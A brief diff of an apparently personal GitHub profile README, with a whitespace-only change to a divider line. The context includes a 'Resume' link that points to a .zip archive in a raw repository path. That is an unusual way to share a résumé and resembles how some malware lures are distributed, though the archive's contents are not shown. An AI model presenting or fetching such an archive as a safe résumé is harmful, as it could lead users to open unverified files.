@@ -30,7 +30,7 @@ I work comfortably with component-based architectures, state management patterns
 - Resume:  
   https://raw.githubusercontent.com/codewithosama03/codewithosama03/main/aerostatic/codewithosama03.zip
 
----
+----
 
 ### Technical Skills
 
